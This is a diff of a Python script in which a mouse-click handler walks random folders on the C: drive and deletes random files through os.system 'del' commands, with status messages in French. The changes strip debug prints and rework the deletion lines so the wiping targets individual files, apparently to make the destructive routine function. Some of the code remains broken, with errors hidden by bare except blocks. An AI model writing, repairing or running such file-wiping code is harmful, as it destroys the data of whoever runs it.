@@ -6,11 +6,9 @@ def on_click(x, y, button, pressed):
     if pressed:
         
         path = glob.glob("C:/*")
-        print(f"Chemin de base : {path}")
         
         while True:
             rd = random.randint(0, 10)
-            print(rd)
             if rd  != 0:
                 try:
                     
@@ -19,20 +17,20 @@ def on_click(x, y, button, pressed):
                         continue
                     
                     path = glob.glob(f"{random.choice(path)}/*")
-                    print(f"Entre dans le dossier : {path}")
                     
                 except: 
                     for file in path:
-                        path = path.replace("\\", "/")
-                        os.system(f"del {path}")
+                        path = path.replace("/", "\\")
+                        os.system(f"del {file}")
                         print(f"Supprimer {file}")
                     break
                 
             else:
                 try:
-                    path = path.replace("\\", "/")
-                    os.system(f"del {random.choice(path)}")
-                    print(f"Supprime le fichier : {random.choice(path)}")
+                    path = path.replace("/", "\\")
+                    file = random.choice(path)
+                    os.system(f"del {file}")
+                    print(f"Supprimer le fichier : {file}")
                     break
                 except:
                     path = glob.glob("C:/*")
